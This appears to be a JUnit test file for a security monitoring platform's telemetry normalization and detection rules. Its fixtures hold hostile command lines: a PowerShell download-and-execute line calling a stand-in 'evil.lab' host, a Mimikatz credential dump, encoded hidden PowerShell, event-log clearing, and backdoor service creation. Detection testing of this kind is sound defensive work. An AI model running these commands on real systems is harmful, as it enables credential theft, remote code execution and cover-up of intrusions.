package com.blueops.telemetry;

import com.blueops.assets.Asset;
import com.blueops.assets.AssetRepository;
import com.blueops.detections.correlation.CorrelationEngine;
import com.blueops.findings.FindingDto;
import com.blueops.findings.OpenSearchFindingAdapter;
import com.blueops.incidents.*;
import com.blueops.threatintel.*;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.data.domain.Example;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.repository.query.FluentQuery;

import java.time.Instant;
import java.util.*;
import java.util.function.Function;

import static org.junit.jupiter.api.Assertions.*;

class TelemetryNormalizationAndDetectionTest {

    private EventNormalizationService normalizationService;
    private DetectionEvaluationService evaluationService;

    private List<FindingDto> registeredFindings;
    private List<IocMatch> savedMatches;
    private Map<String, IocIndicator> testIocs;

    @BeforeEach
    void setUp() {
        normalizationService = new EventNormalizationService();
        registeredFindings = new ArrayList<>();
        savedMatches = new ArrayList<>();
        testIocs = new HashMap<>();

        // Test double for OpenSearchFindingAdapter
        OpenSearchFindingAdapter findingAdapter = new OpenSearchFindingAdapter(
                new RestTemplateBuilder(), "http://localhost:9200", "admin", "admin", false
        ) {
            @Override
            public void registerFinding(FindingDto finding) {
                registeredFindings.add(finding);
                super.registerFinding(finding);
            }

            @Override
            public List<FindingDto> fetchFindings() {
                return new ArrayList<>(registeredFindings);
            }
        };

        // Stubbed IOC Repository
        IocIndicatorRepository iocRepo = new StubIocIndicatorRepository(testIocs);
        IocMatchRepository matchRepo = new StubIocMatchRepository(savedMatches);

        // Stubbed Asset Repository
        Asset labAsset = new Asset();
        labAsset.setId(1L);
        labAsset.setPersistentId("WIN-ASSET-001");
        labAsset.setHostname("WIN-WORKSTATION-01");
        labAsset.setIpAddress("192.168.56.101");
        AssetRepository assetRepo = new StubAssetRepository(labAsset);

        CorrelationEngine correlationEngine = new CorrelationEngine();

        IncidentRepository incidentRepo = new StubIncidentRepository();
        IncidentService incidentService = new IncidentService(incidentRepo, assetRepo, findingAdapter) {
            @Override
            public IncidentDto createIncident(IncidentCreateRequest request, String creator) {
                IncidentDto inc = new IncidentDto();
                inc.setId(999L);
                inc.setIncidentNumber("INC-2026-TEST");
                inc.setTitle(request.getTitle());
                inc.setSeverity(request.getSeverity().name());
                return inc;
            }

            @Override
            public void addNote(Long incidentId, IncidentNoteRequest request, String author) {
                // stub
            }
        };

        evaluationService = new DetectionEvaluationService(
                iocRepo, matchRepo, findingAdapter,
                correlationEngine, incidentService, incidentRepo, assetRepo
        );
    }

    @Test
    @DisplayName("Normalization: Should normalize raw Sysmon telemetry into Common Event Schema")
    void shouldNormalizeSysmonTelemetry() {
        Map<String, Object> raw = new HashMap<>();
        raw.put("provider", "Sysmon");
        raw.put("EventID", 1);
        raw.put("hostname", "WIN-WORKSTATION-01");
        raw.put("Image", "C:\\Windows\\System32\\cmd.exe");
        raw.put("CommandLine", "cmd.exe /c whoami");
        raw.put("username", "corp\\john");

        NormalizedEvent event = normalizationService.normalize(raw);

        assertNotNull(event);
        assertEquals("Sysmon", event.getEvent().getProvider());
        assertEquals("Windows", event.getHost().getOsName());
        assertEquals("cmd.exe", event.getProcess().getName());
        assertEquals("corp\\john", event.getUser().getName());
    }

    @Test
    @DisplayName("Detection: Should trigger D008 on obfuscated/encoded PowerShell command")
    void shouldDetectEncodedPowerShell() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "powershell.exe",
                "CommandLine", "powershell.exe -noni -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D008".equals(f.getRuleId())));
        assertEquals("HIGH", findings.get(0).getRuleSeverity());
    }

    @Test
    @DisplayName("Detection: Should trigger D009 on Office document spawning command shell")
    void shouldDetectOfficeSpawningCommandInterpreter() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "ParentImage", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "Image", "C:\\Windows\\System32\\cmd.exe",
                "CommandLine", "cmd.exe /c calc.exe"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D009".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D011 on Mimikatz LSASS memory harvesting")
    void shouldDetectMimikatzLsassDump() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "C:\\Temp\\mimikatz.exe",
                "CommandLine", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D011".equals(f.getRuleId())));
        assertEquals("CRITICAL", findings.get(0).getRuleSeverity());
    }

    @Test
    @DisplayName("Threat Intel: Should trigger D015 and record match on known malicious IP")
    void shouldDetectThreatIntelIocMatch() {
        IocIndicator ioc = new IocIndicator();
        ioc.setIndicatorValue("198.51.100.24");
        ioc.setIndicatorType(IocType.IP);
        ioc.setSource("AlienVault OTX");
        ioc.setSeverity("HIGH");
        ioc.setStatus("ACTIVE");
        ioc.setConfidence(95);

        testIocs.put("198.51.100.24", ioc);

        Map<String, Object> raw = Map.of(
                "provider", "Suricata",
                "hostname", "WIN-WORKSTATION-01",
                "dest_ip", "198.51.100.24",
                "dest_port", 4444
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D015".equals(f.getRuleId())));
        assertEquals(1, savedMatches.size());
        assertEquals("198.51.100.24", savedMatches.get(0).getMatchedValue());
    }

    @Test
    @DisplayName("False Positive Immunity: Benign admin activity should produce 0 findings")
    void shouldProduceNoFindingsOnBenignActivity() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "C:\\Windows\\System32\\notepad.exe",
                "CommandLine", "notepad.exe C:\\Users\\analyst\\report.txt"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertTrue(findings.isEmpty());
    }

    @Test
    @DisplayName("Detection: Should trigger D007 on suspicious systemd service installation")
    void shouldDetectSystemdServiceCreation() {
        Map<String, Object> raw = Map.of(
                "provider", "auditd",
                "hostname", "LAB-LNX-01",
                "file_path", "/etc/systemd/system/backdoor.service",
                "command", "cp /tmp/backdoor.service /etc/systemd/system/backdoor.service"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D007".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D012 on unexpected kernel driver loading")
    void shouldDetectDriverLoading() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "action", "driver_loaded",
                "file_path", "C:\\Temp\\evil_driver.sys"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D012".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D013 on security event log clearing")
    void shouldDetectEventLogClearing() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "C:\\Windows\\System32\\wevtutil.exe",
                "CommandLine", "wevtutil.exe cl Security"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D013".equals(f.getRuleId())));
        assertEquals("CRITICAL", findings.get(0).getRuleSeverity());
    }

    @Test
    @DisplayName("Detection: Should trigger D016 on hosts file modification")
    void shouldDetectProtectedFileModification() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "file_path", "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "CommandLine", "echo '1.2.3.4 updates.microsoft.com' >> /etc/hosts"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D016".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D017 on repeated authentication failures")
    void shouldDetectRepeatedAuthenticationFailures() {
        Map<String, Object> raw = Map.of(
                "provider", "auditd",
                "hostname", "LAB-LNX-01",
                "action", "failed_login",
                "src_ip", "10.0.0.55"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D017".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D018 on unusual administrative service activity")
    void shouldDetectUnusualAdministrativeServiceCreation() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "C:\\Windows\\System32\\sc.exe",
                "CommandLine", "sc.exe create MaliciousService binpath= C:\\Temp\\evil.exe start= auto"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D018".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Detection: Should trigger D008 on unencoded PowerShell download cradle")
    void shouldDetectPowerShellDownloadCradle() {
        Map<String, Object> raw = Map.of(
                "provider", "Sysmon",
                "hostname", "WIN-WORKSTATION-01",
                "Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine", "powershell.exe -NoP -NonI -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.lab/p.ps1')"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D008".equals(f.getRuleId())));
    }

    @Test
    @DisplayName("Threat Intel: Should detect IOC match regardless of case and from related IPs")
    void shouldDetectCaseInsensitiveAndRelatedIocMatch() {
        IocIndicator ioc = new IocIndicator();
        ioc.setIndicatorValue("c2.adversary-infrastructure.org");
        ioc.setIndicatorType(IocType.DOMAIN);
        ioc.setSource("CISA KEV");
        ioc.setSeverity("CRITICAL");
        ioc.setStatus("ACTIVE");
        ioc.setConfidence(99);

        testIocs.put("c2.adversary-infrastructure.org", ioc);

        Map<String, Object> raw = Map.of(
                "provider", "Suricata",
                "hostname", "WIN-WORKSTATION-01",
                "dest_ip", "198.51.100.99",
                "domain", "C2.ADVERSARY-INFRASTRUCTURE.ORG"
        );

        NormalizedEvent event = normalizationService.normalize(raw);
        List<FindingDto> findings = evaluationService.evaluate(event);

        assertFalse(findings.isEmpty());
        assertTrue(findings.stream().anyMatch(f -> "D015".equals(f.getRuleId())));
        assertEquals(1, savedMatches.size());
    }

    @Test
    @DisplayName("Normalization: Should clamp limit safely and route unparseable event to DLQ")
    void shouldClampLimitAndRouteToDlq() {
        // Safe limit clamping
        assertTrue(normalizationService.getRecentEvents(0).isEmpty());
        assertTrue(normalizationService.getRecentEvents(-5).isEmpty());
        assertTrue(normalizationService.getDeadLetterQueue(0).isEmpty());
        assertTrue(normalizationService.getDeadLetterQueue(-1).isEmpty());

        // Ingest malformed payload (invalid ID type causing normalization exception)
        Map<String, Object> malformed = new HashMap<>();
        malformed.put("id", 99999); // ClassCastException -> routed to DLQ

        NormalizedEvent normalized = normalizationService.normalize(malformed);
        assertNull(normalized);

        List<Map<String, Object>> dlq = normalizationService.getDeadLetterQueue(10);
        assertFalse(dlq.isEmpty());
        assertTrue(dlq.get(0).containsKey("dlq_error"));
        assertEquals(1L, normalizationService.getTelemetryStats().get("totalFailedDlq"));
    }

    // --- Lightweight Test Double Implementations ---

    private static class StubIocIndicatorRepository implements IocIndicatorRepository {
        private final Map<String, IocIndicator> store;

        StubIocIndicatorRepository(Map<String, IocIndicator> store) { this.store = store; }

        @Override public Optional<IocIndicator> findByIndicatorValue(String indicatorValue) { return Optional.ofNullable(store.get(indicatorValue)); }
        @Override
        public Optional<IocIndicator> findByIndicatorValueIgnoreCase(String indicatorValue) {
            if (indicatorValue == null) return Optional.empty();
            for (Map.Entry<String, IocIndicator> entry : store.entrySet()) {
                if (entry.getKey().equalsIgnoreCase(indicatorValue)) {
                    return Optional.of(entry.getValue());
                }
            }
            return Optional.empty();
        }
        @Override public Optional<IocIndicator> findByIndicatorValueAndIndicatorType(String val, IocType type) { return Optional.ofNullable(store.get(val)); }
        @Override public List<IocIndicator> findByStatus(String status) { return new ArrayList<>(store.values()); }
        @Override public List<IocIndicator> findByIndicatorType(IocType indicatorType) { return Collections.emptyList(); }
        @Override public boolean existsByIndicatorValueAndIndicatorType(String val, IocType type) { return store.containsKey(val); }
        @Override public <S extends IocIndicator> S save(S entity) { store.put(entity.getIndicatorValue(), entity); return entity; }
        @Override public <S extends IocIndicator> List<S> saveAll(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public Optional<IocIndicator> findById(Long aLong) { return Optional.empty(); }
        @Override public boolean existsById(Long aLong) { return false; }
        @Override public List<IocIndicator> findAll() { return new ArrayList<>(store.values()); }
        @Override public List<IocIndicator> findAllById(Iterable<Long> longs) { return Collections.emptyList(); }
        @Override public long count() { return store.size(); }
        @Override public void deleteById(Long aLong) {}
        @Override public void delete(IocIndicator entity) {}
        @Override public void deleteAllById(Iterable<? extends Long> longs) {}
        @Override public void deleteAll(Iterable<? extends IocIndicator> entities) {}
        @Override public void deleteAll() {}
        @Override public void flush() {}
        @Override public <S extends IocIndicator> S saveAndFlush(S entity) { return entity; }
        @Override public <S extends IocIndicator> List<S> saveAllAndFlush(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public void deleteAllInBatch(Iterable<IocIndicator> entities) {}
        @Override public void deleteAllByIdInBatch(Iterable<Long> longs) {}
        @Override public void deleteAllInBatch() {}
        @Override public IocIndicator getOne(Long aLong) { return null; }
        @Override public IocIndicator getById(Long aLong) { return null; }
        @Override public IocIndicator getReferenceById(Long aLong) { return null; }
        @Override public <S extends IocIndicator> Optional<S> findOne(Example<S> example) { return Optional.empty(); }
        @Override public <S extends IocIndicator> List<S> findAll(Example<S> example) { return Collections.emptyList(); }
        @Override public <S extends IocIndicator> List<S> findAll(Example<S> example, Sort sort) { return Collections.emptyList(); }
        @Override public <S extends IocIndicator> Page<S> findAll(Example<S> example, Pageable pageable) { return Page.empty(); }
        @Override public <S extends IocIndicator> long count(Example<S> example) { return 0; }
        @Override public <S extends IocIndicator> boolean exists(Example<S> example) { return false; }
        @Override public <S extends IocIndicator, R> R findBy(Example<S> example, Function<FluentQuery.FetchableFluentQuery<S>, R> queryFunction) { return null; }
        @Override public List<IocIndicator> findAll(Sort sort) { return Collections.emptyList(); }
        @Override public Page<IocIndicator> findAll(Pageable pageable) { return Page.empty(); }
    }

    private static class StubIocMatchRepository implements IocMatchRepository {
        private final List<IocMatch> list;
        StubIocMatchRepository(List<IocMatch> list) { this.list = list; }
        @Override public <S extends IocMatch> S save(S entity) { list.add(entity); return entity; }
        @Override public List<IocMatch> findTop50ByOrderByEventTimestampDesc() { return list; }
        @Override public List<IocMatch> findByIocId(Long iocId) { return Collections.emptyList(); }
        @Override public <S extends IocMatch> List<S> saveAll(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public Optional<IocMatch> findById(Long aLong) { return Optional.empty(); }
        @Override public boolean existsById(Long aLong) { return false; }
        @Override public List<IocMatch> findAll() { return list; }
        @Override public List<IocMatch> findAllById(Iterable<Long> longs) { return Collections.emptyList(); }
        @Override public long count() { return list.size(); }
        @Override public void deleteById(Long aLong) {}
        @Override public void delete(IocMatch entity) {}
        @Override public void deleteAllById(Iterable<? extends Long> longs) {}
        @Override public void deleteAll(Iterable<? extends IocMatch> entities) {}
        @Override public void deleteAll() {}
        @Override public void flush() {}
        @Override public <S extends IocMatch> S saveAndFlush(S entity) { return entity; }
        @Override public <S extends IocMatch> List<S> saveAllAndFlush(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public void deleteAllInBatch(Iterable<IocMatch> entities) {}
        @Override public void deleteAllByIdInBatch(Iterable<Long> longs) {}
        @Override public void deleteAllInBatch() {}
        @Override public IocMatch getOne(Long aLong) { return null; }
        @Override public IocMatch getById(Long aLong) { return null; }
        @Override public IocMatch getReferenceById(Long aLong) { return null; }
        @Override public <S extends IocMatch> Optional<S> findOne(Example<S> example) { return Optional.empty(); }
        @Override public <S extends IocMatch> List<S> findAll(Example<S> example) { return Collections.emptyList(); }
        @Override public <S extends IocMatch> List<S> findAll(Example<S> example, Sort sort) { return Collections.emptyList(); }
        @Override public <S extends IocMatch> Page<S> findAll(Example<S> example, Pageable pageable) { return Page.empty(); }
        @Override public <S extends IocMatch> long count(Example<S> example) { return 0; }
        @Override public <S extends IocMatch> boolean exists(Example<S> example) { return false; }
        @Override public <S extends IocMatch, R> R findBy(Example<S> example, Function<FluentQuery.FetchableFluentQuery<S>, R> queryFunction) { return null; }
        @Override public List<IocMatch> findAll(Sort sort) { return Collections.emptyList(); }
        @Override public Page<IocMatch> findAll(Pageable pageable) { return Page.empty(); }
    }

    private static class StubAssetRepository implements AssetRepository {
        private final Asset asset;
        StubAssetRepository(Asset asset) { this.asset = asset; }
        @Override public Optional<Asset> findByPersistentId(String id) { return Optional.of(asset); }
        @Override public Optional<Asset> findByHostname(String host) { return Optional.of(asset); }
        @Override public Optional<Asset> findByHostnameIgnoreCase(String host) { return Optional.of(asset); }
        @Override public Optional<Asset> findByIpAddress(String ip) { return Optional.of(asset); }
        @Override public boolean existsByPersistentId(String id) { return true; }
        @Override public <S extends Asset> S save(S entity) { return entity; }
        @Override public <S extends Asset> List<S> saveAll(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public Optional<Asset> findById(Long aLong) { return Optional.of(asset); }
        @Override public boolean existsById(Long aLong) { return true; }
        @Override public List<Asset> findAll() { return List.of(asset); }
        @Override public List<Asset> findAllById(Iterable<Long> longs) { return List.of(asset); }
        @Override public long count() { return 1; }
        @Override public void deleteById(Long aLong) {}
        @Override public void delete(Asset entity) {}
        @Override public void deleteAllById(Iterable<? extends Long> longs) {}
        @Override public void deleteAll(Iterable<? extends Asset> entities) {}
        @Override public void deleteAll() {}
        @Override public void flush() {}
        @Override public <S extends Asset> S saveAndFlush(S entity) { return entity; }
        @Override public <S extends Asset> List<S> saveAllAndFlush(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public void deleteAllInBatch(Iterable<Asset> entities) {}
        @Override public void deleteAllByIdInBatch(Iterable<Long> longs) {}
        @Override public void deleteAllInBatch() {}
        @Override public Asset getOne(Long aLong) { return asset; }
        @Override public Asset getById(Long aLong) { return asset; }
        @Override public Asset getReferenceById(Long aLong) { return asset; }
        @Override public <S extends Asset> Optional<S> findOne(Example<S> example) { return Optional.empty(); }
        @Override public <S extends Asset> List<S> findAll(Example<S> example) { return Collections.emptyList(); }
        @Override public <S extends Asset> List<S> findAll(Example<S> example, Sort sort) { return Collections.emptyList(); }
        @Override public <S extends Asset> Page<S> findAll(Example<S> example, Pageable pageable) { return Page.empty(); }
        @Override public <S extends Asset> long count(Example<S> example) { return 0; }
        @Override public <S extends Asset> boolean exists(Example<S> example) { return false; }
        @Override public <S extends Asset, R> R findBy(Example<S> example, Function<FluentQuery.FetchableFluentQuery<S>, R> queryFunction) { return null; }
        @Override public List<Asset> findAll(Sort sort) { return List.of(asset); }
        @Override public Page<Asset> findAll(Pageable pageable) { return Page.empty(); }
    }

    private static class StubIncidentRepository implements IncidentRepository {
        @Override public Optional<Incident> findByIncidentNumber(String incidentNumber) { return Optional.empty(); }
        @Override public List<Incident> findByStatus(IncidentStatus status) { return Collections.emptyList(); }
        @Override public Page<Incident> findByStatus(IncidentStatus status, Pageable pageable) { return Page.empty(); }
        @Override public long countByStatus(IncidentStatus status) { return 0; }
        @Override public long countBySeverity(IncidentSeverity severity) { return 0; }
        @Override public Page<Incident> findFiltered(IncidentStatus status, IncidentSeverity severity, Pageable pageable) { return Page.empty(); }
        @Override public Page<Incident> findFilteredAdvanced(IncidentStatus status, IncidentSeverity severity, com.blueops.incidents.IncidentPriority priority, String assignedTo, String query, Pageable pageable) { return Page.empty(); }
        @Override public long countActiveIncidents() { return 0; }
        @Override public List<Incident> findActiveByTitleAndAsset(String title, Long assetId) { return Collections.emptyList(); }
        @Override public long countAssetsWithActiveIncidents() { return 0; }
        @Override public List<Incident> findTop5ByOrderByCreatedAtDesc() { return Collections.emptyList(); }
        @Override public List<Incident> findByContainedAtIsNotNullAndCreatedAtIsNotNull() { return Collections.emptyList(); }
        @Override public <S extends Incident> S save(S entity) { entity.setId(100L); return entity; }
        @Override public <S extends Incident> List<S> saveAll(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public Optional<Incident> findById(Long aLong) { return Optional.empty(); }
        @Override public boolean existsById(Long aLong) { return false; }
        @Override public List<Incident> findAll() { return Collections.emptyList(); }
        @Override public List<Incident> findAllById(Iterable<Long> longs) { return Collections.emptyList(); }
        @Override public long count() { return 0; }
        @Override public void deleteById(Long aLong) {}
        @Override public void delete(Incident entity) {}
        @Override public void deleteAllById(Iterable<? extends Long> longs) {}
        @Override public void deleteAll(Iterable<? extends Incident> entities) {}
        @Override public void deleteAll() {}
        @Override public void flush() {}
        @Override public <S extends Incident> S saveAndFlush(S entity) { return entity; }
        @Override public <S extends Incident> List<S> saveAllAndFlush(Iterable<S> entities) { return Collections.emptyList(); }
        @Override public void deleteAllInBatch(Iterable<Incident> entities) {}
        @Override public void deleteAllByIdInBatch(Iterable<Long> longs) {}
        @Override public void deleteAllInBatch() {}
        @Override public Incident getOne(Long aLong) { return null; }
        @Override public Incident getById(Long aLong) { return null; }
        @Override public Incident getReferenceById(Long aLong) { return null; }
        @Override public <S extends Incident> Optional<S> findOne(Example<S> example) { return Optional.empty(); }
        @Override public <S extends Incident> List<S> findAll(Example<S> example) { return Collections.emptyList(); }
        @Override public <S extends Incident> List<S> findAll(Example<S> example, Sort sort) { return Collections.emptyList(); }
        @Override public <S extends Incident> Page<S> findAll(Example<S> example, Pageable pageable) { return Page.empty(); }
        @Override public <S extends Incident> long count(Example<S> example) { return 0; }
        @Override public <S extends Incident> boolean exists(Example<S> example) { return false; }
        @Override public <S extends Incident, R> R findBy(Example<S> example, Function<FluentQuery.FetchableFluentQuery<S>, R> queryFunction) { return null; }
        @Override public List<Incident> findAll(Sort sort) { return Collections.emptyList(); }
        @Override public Page<Incident> findAll(Pageable pageable) { return Page.empty(); }
    }
}
